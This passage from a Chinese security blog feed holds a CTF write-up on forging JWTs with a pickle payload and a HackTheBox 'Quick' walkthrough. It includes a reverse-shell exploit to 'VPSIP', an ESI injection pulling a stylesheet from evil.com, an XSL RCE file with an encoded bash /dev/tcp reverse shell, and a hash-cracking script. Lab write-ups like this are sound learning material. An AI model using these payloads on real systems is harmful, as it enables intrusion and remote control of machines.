class="line">print(token)</span><br></pre></td></tr></table></figure><p>通过上面的脚本，我发现更换cookie时得到的报错回显不再是<code>Invalid Signature</code>，而是<code>Invalid load key</code><br>这其实是一个好消息，因为经过搜索后这是一个pickle的报错。也就是说我们已经通过校验了，只要剩下的payload部分是有效的picklebase64数据即可。</p><p>然而仔细一想发现问题不对。jwt作为<code>json web token</code>，有效的传输数据都应该是json数据。但这里居然直接把pickle的opcodebase64后放在了payload部分。这让当时的我无法理解。这也就意味着：payload的原始内容在python中不是一个字典，也就是说我们无法直接通过pyjwt库进行密文生成。</p><p>于是我去找资料。发现其实jwt的HS256签名是hmac-sha256生成的。其中key是jwt的secretkey.data是<code>base64(header).base64(payload)</code>整体</p><p>所以我们可以使用脚本手动拼接。<br>下面直接给出完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPSIP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">data =(<span class="string">"eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."</span>+payload).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line">signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())</span><br><span class="line"><span class="comment">#print(signature)</span></span><br><span class="line">print(data.decode()+<span class="string">'.'</span>+signature.decode().rstrip(<span class="string">'='</span>))</span><br></pre></td></tr></table></figure><p>解释几点<br>1.payload部分pickle与cPickle都可以。但是这里是python3环境，还是得用python3生成。</p><p>2.注意我使用了<code>base64.urlsafe_b64encode</code>而不是<code>base64encode</code>。这点上面也讲过了，jwt中不会出现<code>/</code>和<code>=</code>这样的字符的。比赛中我并没有去详细查询，而是直接手动将<code>/</code>替换成<code>_</code>并去掉<code>=</code>同样得到了有效的key.</p><p>3.这里生成pickle的payload我也同样做了点手脚：在弹shell的代码后加了几个空格。原因同上，因为payload部分同样不允许<code>=</code>这样的字符。所以可以手动加空格防止出现<code>=</code>.</p><p>4.弹shell只可能使用python或bash反弹shell.因为这个靶机真的啥都没有（curl,wget,nc）。当然如果渗透linux靶机做多了也能发现python弹shell真的万金油。没有用bash纯粹是因为搞忘了:(</p><p>5.最后wp放出来后有网友说直接照搬我的exp服务端会报错<code>module &#39;nt&#39; not found</code>。我试了下发现居然真的有这个问题。但是比赛时我是用vps上的python3.5生成的payload,经测试还是可以成功RCE。而换到本机上的python3.7就出错了。最后对比payload发现两者生成的签名不一致，这里我只能推断是加密算法的问题。毕竟本机上的pycrypto我一直没弄好过。</p><p>最后成功弹shell.<br><img src="/2020/06/24/Make-jwt-great-again/6.PNG" alt></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>jwt安全的相关漏洞我认为基本上就只有以上这些了。因为其实其他相关的洞或多或少都与此相关。只要掌握了这些常见可利用的点，并且了解一下算法的流程，即使碰到最后一道题这种变通性极强的也能顺着思路走下去</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Quick-一次艰难的渗透</title>
      <link href="2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/"/>
      <url>2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>因为现在还没有接到确切通知说是否考试,原本期末复习的计划也被打乱了。既然现在复习觉得有点亏，于是干脆去做做hackthebox的靶机算了，正好好久没写wp了2333。</p><p>虽然没更新文章，但是其实自己每周都在跟着ippsec的视频做退役靶机。当然其实也做了5.6台现役的。不过今天要写的Quick靶机的wp是自己头一次独立完成的困难难度的靶机。真的真的学到了很多东西。所以一定要记录下。</p><p>另外由于Quick还是active状态，所以我会给文章上锁直到靶机退役。</p><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/head.PNG" alt></p><a id="more"></a><ul><li>靶机ip: 10.10.10.186</li><li>攻击机: 10.10.14.40</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>这一部分真的挺麻烦的……中间有点点脑洞的成分,但总体还是比较符合真实环境的。</p><p>首先必然是nmap端口扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Jun 18 14:43:20 2020 as: nmap -sC -sV -oA nmap/quick 10.10.10.186</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.186</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)</span><br><span class="line">|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)</span><br><span class="line">|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)</span><br><span class="line">9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Quick | Broadband Services</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Jun 18 14:46:54 2020 -- 1 IP address (1 host up) scanned in 214.65 seconds</span></span><br></pre></td></tr></table></figure><p>可以看到只开放了ssh跟9001web端口。尝试访问web页面<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/0.PNG" alt><br>会发现主要信息有</p><ul><li>几个标出了姓名跟公司的留言</li><li>update处指向了一个网页<code>https://portal.quick.htb</code></li></ul><p>同时底部clients定向到clients.php<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/1.PNG" alt></p><p>似乎里面的公司跟前面的人名备注的公司有相同的地方。目前只能说大致可以收集一些信息。<br>访问<code>login.php</code>发现需要用户名跟密码。不过，此处的用户名要求为邮箱登录。密码则没有什么透露的信息。</p><p>web页面的信息收集完了，就应该试试<code>https://portal.quick.htb</code>了</p><p>然而奇怪的是,我们根本没有办法访问这个网页(在修改了<code>/etc/hosts</code>的前提下)。尝试直接curl也同样无果。这时直接陷入僵局。</p><p>在逛了一圈htb的论坛后，发现大家提到了重新build工具这个关键信息。并且提到了，如果访问不了这个页面，是因为浏览器无法理解收到的信息。所以访问不了。并且最好尝试其他protocol.</p><p>在留意到protocol这个关键词后，我开始尝试跑一遍udp端口的nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Fri Jun 19 20:33:51 2020 as: nmap -sU -oA nmap/quick-udp 10.10.10.186</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> portal.quick.htb (10.10.10.186)</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">443/udp open|filtered https</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Jun 19 20:50:40 2020 -- 1 IP address (1 host up) scanned in 1008.38 seconds</span></span><br></pre></td></tr></table></figure><p>原来在udp的443端口有https服务。看来大概率就是我们之前的网站了。此时搜索相关信息，会发现这应该是HTTP/3协议。因为HTTP/3的一个重要特征就是将弃用TCP协议，改为使用基于UDP协议的QUIC协议实现。<br>可以看下维基跟这篇文章。<br><a href="https://www.slideshare.net/bagder/http3-in-curl" target="_blank" rel="noopener">http3-in-curl</a></p><p>http/3协议虽然是新趋势，但是目前能唯一有效连接的工具还是只有curl.所以我猜测论坛里大家提到的就是重新编译curl以支持http3.</p><p>然而这一步十分耗时间，因为必须要下<code>Quiche</code>重新编译，下<code>brew</code>来进行包管理……总之我连brew都没下完就放弃了这个选择，因为国内实在太慢了，换了git源后又因为其他源继续龟速下载…这时我在搜索内容中注意到docker有现成的镜像。于是果断换docker进行curl。(docker的最大价值就是为我们节省了配环境的大把时间)<br>pull一个<code>ymuski/curl-http3</code>镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm ymuski/curl-http3 curl -V</span><br></pre></td></tr></table></figure><p>检查下支持http3.这样就可以用<code>--http3</code>来访问网址了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm ymuski/curl-http3 curl https://10.10.10.186 --http3</span><br></pre></td></tr></table></figure><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/2.PNG" alt></p><p>发现几个链接。一个个访问后发现docs文档有两个pdf。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Quick | References<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/QuickStart.pdf"</span>&gt;</span>Quick-Start Guide<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/Connectivity.pdf"</span>&gt;</span>Connectivity Guide<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开始果断尝试直接<code>-o</code>输出，但是却搞忘了，这里是调用的docker执行命令。那么我们的输出在镜像里面。所以我得挂载一个目录来获取输出的pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v /mnt/curl:/tmp ymuski/curl-http3 curl 10.10.10.186 --http3 -o /tmp/xxx.pdf</span><br></pre></td></tr></table></figure><p>在其中一个pdf中得到关键信息。也就是密码。<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/3.PNG" alt></p><p>那么接下来就是尝试登录了。这也是起手式这里又一个难点。原先htb的邮箱基本上都是<code>admin@{box的hostname}.htb</code>这种形式的。但是此处常规尝试都不起效果。于是只能手动写脚本组合下之前的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">list=[]</span><br><span class="line">users=[<span class="string">'tim'</span>,<span class="string">'roy'</span>,<span class="string">'elisa'</span>,<span class="string">'james'</span>,<span class="string">'mike'</span>,<span class="string">'jane'</span>,<span class="string">'john'</span>]</span><br><span class="line">postfix=[<span class="string">'qconsulting.co.uk'</span>,<span class="string">'darkwing.com'</span>,<span class="string">'wink.co.uk'</span>,<span class="string">'lazycoop.cn'</span>,<span class="string">'scoobydoo.it'</span>,<span class="string">'penguincrop.fr'</span>]</span><br><span class="line">postfix2=[<span class="string">'qconsulting.co.uk'</span>,<span class="string">'darkwing.com'</span>,<span class="string">'wink.co.uk'</span>,<span class="string">'lazycoop.com.cn'</span>,<span class="string">'scoobydoo.co.it'</span>,<span class="string">'penguincrop.co.fr'</span>]</span><br><span class="line">postfix3=[<span class="string">'qconsulting.htb.uk'</span>,<span class="string">'darkwing.htb'</span>,<span class="string">'wink.htb.uk'</span>,<span class="string">'lazycoop.htb.cn'</span>,<span class="string">'scoobydoo.htb.it'</span>,<span class="string">'penguincrop.htb.fr'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix2:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix3:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'creds.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick2():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick3():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>最后尝试出结果后才发现其实不需要过多尝试的。但是重点(难点)就在于，它的邮箱格式非常类似真实的企业邮箱。前面我们主页面的信息结合起来后，其实每个人名对应的公司，国家都是确定的。所以我们主要注意采用二级域名即可。也就是跟在公司名后的<code>.co.fr</code>,<code>.co.it</code>等等。</p><p>得到用户<code>elisa</code>成功登陆后,我们就要准备第三部分的利用了。这里我直觉猜测应该可以RCE,因为htb的靶机如果没法getshell的话连后面的提权都做不到。出于直觉以及最早的信息收集，我认为这里应该是从header中泄露的信息下手<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/4.PNG" alt></p><p>注意到<code>X-Powered-By: Esigate</code>后直接搜索相关信息。了解到这是一个模板相关的java服务。可以起到搭配phpcms并且将html片段进行整合的作用。并且进一步了解后发现存在RCE漏洞。</p><p>找了好几篇文章都没有关键代码。只有这篇提到了<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>触发的payload如下，显然也是因为引入了外部的恶意xsl导致RCE。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"http://website.com/"</span> <span class="attr">stylesheet</span>=<span class="string">"http://evil.com/esi.xsl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">esi:include</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我注意到前面的src是website.com所以我在使用自己的payload时将其改为了<code>10.10.10.186:9001</code>。后来也证明如果不改的话，触发时会出现<code>error retrieving url</code>的报错。</p><p>接下来则是尝试如何触发的问题。这里我按打CTF的直觉认为应该是<code>ticket.php</code>传payload.<code>search.php</code>传search参数进行触发。当然网页也提醒了，当你传完ticket后会返回一个预先置好的ticketid。只要在<code>search.php</code>搜索对应id即可。</p><p>这里还有一个小坑。那就是java的命令执行问题。开始尝试触发时发现主要问题是：</p><ul><li>一个ticket传一次后就失效了。导致我每次得更改xsl的名字。</li><li>命令执行<code>curl 10.10.10.14.40|bash</code>失败。估计又是java的锅。</li></ul><p>如果稍微过一遍上面那篇文章中的xsl.会发现肯定是调用了<code>java.lang.Runtime.getRuntime().exec()</code>来执行命令的。所以肯定存在单条命令特殊字符过不去的问题。当然解决方法在做<code>vulhub</code>各种java反序列化时就用烂了。使用编码绕过即可。<br><a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><p>最后我的xsl payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"xml"</span> <span class="attr">omit-xml-declaration</span>=<span class="string">"yes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:rt</span>=<span class="string">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"cmd"</span>&gt;</span>&lt;![CDATA[bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;]]&gt;<span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"rtObj"</span> <span class="attr">select</span>=<span class="string">"rt:getRuntime()"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"process"</span> <span class="attr">select</span>=<span class="string">"rt:exec($rtObj, $cmd)"</span>/&gt;</span></span><br><span class="line">Process: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$process"</span>/&gt;</span></span><br><span class="line">Command: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$cmd"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先raise一个ticket后准备好监听，search.php传值直接触发<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/5.PNG" alt></p><p>到此为止即可弹到用户sam的shell。拿到user.txt</p><p>上面一套流程走下来后花了快有7个小时。只能算是配环境(甚至还没配成)跟猜用户名的锅。但同时也表现出<code>enumeration</code>的过程有多重要。否则甚至不能正常进行后面的提权。java的命令执行这个小trick对于新手而言也许很坑。但是仍然是有方法的。比如wget一个netcat过去再执行(windows常规操作，尤其是在windowsdefender日渐强大的今天)。假如熟悉java的话则应该很快就能构造出弹shell的payload.不至于卡在RCE却无法getshell.</p><h2 id="privesc-to-srvadm"><a href="#privesc-to-srvadm" class="headerlink" title="privesc to srvadm"></a>privesc to srvadm</h2><p>得到用户sam后准备开始提权。首先是常规的<code>linpeas.sh</code>传到靶机上扫一遍。接着是<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>维持shell.毕竟一套流程下来getshell也不是那么迅速的。(当然可以写个ssh公钥，就是我搞忘了2333)</p><p>脚本扫过一遍后并没有什么收获。倒是在<code>html</code>的源码里找到了php的<code>db.php</code>泄露了数据库信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"db_adm"</span>,<span class="string">"db_p4ss"</span>,<span class="string">"quick"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登录mysql从users表里拿到两个用户及各自密码的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |</span><br><span class="line">| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |</span><br></pre></td></tr></table></figure><p>此时靶机还剩下一个要提权的用户<code>srvadm</code>。这里泄露了密码，当然要去php源码里看看密码是怎么与hash进行对比的<br>login.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=md5(crypt($password,<span class="string">'fa'</span>))</span><br></pre></td></tr></table></figure><p>既然盐值以及加密都不算难。我们直接用脚本+rockyou.txt来试试爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'rockyou.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        word=f.readline().strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    hashes=crypt.crypt(word,<span class="string">'fa'</span>)</span><br><span class="line">    cipher=get_md5(hashes)</span><br><span class="line">    <span class="keyword">if</span> cipher==<span class="string">'e626d51f8fbfd1124fdea88396c35d05'</span>:</span><br><span class="line">        print(<span class="string">'Found: '</span>+word)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到srvadm的密码后当然先试试看是不是ssh或者系统密码了。但很可惜都不是。既然如此，这个密码只能在web服务上发挥作用了。那么说还有其他web服务？</p><p>这时我注意到了<code>/var/www/</code>里除了html还有两个文件夹<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/6.PNG" alt></p><p>诡异的是jobs是<code>777</code>权限。似乎可以做文章。那么转而去旁边的printer中找。发现又是一套带了cms的php源码。并且用的数据库跟之前html中的是一致的。也就是说我们爆破出的密码有用了。</p><p>简单审下后发现一个似乎存在漏洞的地方(实际上当时关注点错了)<br>job.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 